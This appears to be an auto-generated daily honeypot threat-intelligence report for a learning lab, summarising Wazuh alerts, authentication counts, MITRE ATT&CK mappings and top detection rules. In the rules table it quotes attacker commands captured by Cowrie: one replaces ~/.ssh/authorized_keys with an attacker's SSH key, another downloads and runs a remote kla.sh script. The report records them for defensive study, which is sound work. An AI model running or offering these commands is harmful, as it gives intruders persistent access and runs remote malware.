# LearningLab01 Daily Threat Intelligence Report — 2026-10-10

Generated: 2026-10-10T13:15:05.064Z

Report window: 2026-10-09T13:15:05.031Z through 2026-10-10T13:15:05.031Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 265,462 |
| Attack-related alerts | 18,324 |
| Honeypot interactions | 244,473 |
| Authentication failures | 4,966 |
| Authentication successes | 456 |
| Critical alerts | 374 |
| High alerts | 1,786 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 374 critical-severity alerts require priority review.
- 1,786 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 10.89:1.
- Country attribution currently covers only 15.60% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (70,411 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 374 | 0.14% |
| High | 1,786 | 0.67% |
| Medium | 2,891 | 1.09% |
| Low | 260,411 | 98.10% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 4,966
- Authentication successes: 456
- Failure-to-success ratio: 10.89:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 10,907 | 59.52% |
| Payload delivery | 10,907 | 59.52% |
| Authentication failure | 4,966 | 27.10% |
| Command execution | 1,242 | 6.78% |
| Reconnaissance | 760 | 4.15% |
| Network scan | 254 | 1.39% |
| Malware | 104 | 0.57% |
| Web attack | 33 | 0.18% |
| SMTP attack | 19 | 0.10% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 41,408 alerts, representing 15.60% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 224,054 | 84.40% | Not geolocated |
| Bulgaria | 39,844 | 15.01% | ████████████████████ |
| Republic of Moldova | 724 | 0.27% | █ |
| United Kingdom | 455 | 0.17% | █ |
| Germany | 338 | 0.13% | █ |
| United States | 28 | 0.01% | █ |
| Singapore | 13 | 0.00% | █ |
| Russia | 3 | 0.00% | █ |
| France | 2 | 0.00% | █ |
| Turkey | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 298 |
| Defense Evasion | 292 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 71 |
| Impact | 32 |
| Execution | 23 |
| Command and Control | 10 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 71 |
| Stored Data Manipulation | 32 |
| Command and Scripting Interpreter | 23 |
| Ingress Tool Transfer | 10 |
| Exploit Public-Facing Application | 7 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 70,411 | T-Pot RDP connection from [IP address] to port 3389. | tpot (70,411) |
| 110207 | 5 | 49,494 | T-Pot SentryPeer SIP activity from [IP address]:63494, method INVITE | tpot (49,494) |
| 110204 | 4 | 49,255 | T-Pot Honeytrap connection from [IP address] to port 5901 | tpot (49,255) |
| 110219 | 4 | 40,854 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html?fcadbadd=1 HTTP/1.1" 200 - | tpot (40,854) |
| 110209 | 5 | 21,915 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (21,915) |
| 110205 | 6 | 10,824 | T-Pot Honeytrap received a payload from [IP address] | tpot (10,824) |
| 110101 | 3 | 5,949 | Cowrie SSH connection from [IP address]. | tpot (5,949) |
| 110102 | 5 | 4,966 | Cowrie failed login from [IP address] using username admin. | tpot (4,966) |
| 23502 | 3 | 3,831 | The CVE-2012-4542 that affected linux-image-6.8.0-139-generic was solved due to an update in the agent or feed. | tpot (3,831) |
| 23508 | 3 | 1,606 | CVE-2012-4542 affects linux-image-6.8.0-146-generic (Missing information, CVE awaiting analysis) | tpot (1,606) |
| 23505 | 10 | 1,370 | CVE-2017-13165 affects linux-image-6.8.0-146-generic | tpot (1,370) |
| 110104 | 7 | 1,098 | Cowrie captured a command from [IP address]: &k`g&k\|zpkfq)ES[M | tpot (1,098) |
| 110201 | 4 | 561 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (561) |
| 23504 | 7 | 544 | CVE-2015-7837 affects linux-image-6.8.0-146-generic | tpot (544) |
| 110222 | 9 | 273 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (273) |
| 110214 | 9 | 252 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (252) |
| 23506 | 13 | 242 | CVE-2021-3773 affects linux-image-6.8.0-146-generic | tpot (242) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 110221 | 7 | 191 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (191) |
| 5502 | 3 | 177 | PAM: Login session closed. | tpot (176), wazuh (1) |
| 110103 | 10 | 165 | Cowrie accepted login from [IP address] using username lghkel	. | tpot (165) |
| 110109 | 13 | 125 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (125) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110215 | 4 | 95 | T-Pot MiniPrint event: command_received, action request, Request received | tpot (95) |
| 110220 | 8 | 95 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (95) |
| 110216 | 4 | 85 | T-Pot Mailoney received SMTP command from [IP address]: QUIT  | tpot (85) |
| 110212 | 10 | 83 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (83) |
| 110105 | 12 | 78 | Cowrie captured a file download from [IP address]. | tpot (78) |
| 110106 | 10 | 71 | Cowrie detected repeated failed logins from [IP address]. | tpot (71) |
| 23503 | 5 | 49 | CVE-2018-1121 affects linux-image-6.8.0-146-generic | tpot (49) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 2904 | 7 | 34 | Dpkg (Debian Package) half configured. | tpot (31), wazuh (3) |
| 110223 | 5 | 33 | T-Pot HoneyAML received  request from  to  on port . | tpot (33) |
| 2902 | 7 | 26 | New dpkg (Debian Package) installed. | tpot (24), wazuh (2) |
| 110208 | 7 | 23 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5102 | tpot (23) |
| 550 | 7 | 21 | Integrity checksum changed. | tpot (20), wazuh (1) |
| 110217 | 7 | 19 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (19) |
| 110108 | 12 | 16 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (16) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110225 | 13 | 7 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (7) |
| 203 | 9 | 7 | Agent event queue is full. Events may be lost. | tpot (7) |
| 2901 | 3 | 7 | New dpkg (Debian Package) requested to install. | tpot (7) |
| 2903 | 7 | 7 | Dpkg (Debian Package) removed. | tpot (7) |
| 110107 | 12 | 3 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (3) |
| 202 | 7 | 3 | Agent event queue is 90% full. | tpot (3) |
| 205 | 3 | 3 | Agent event queue is back to normal load. | tpot (3) |
| 110211 | 9 | 2 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |
| 86003 | 3 | 1 | Docker: Error message | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
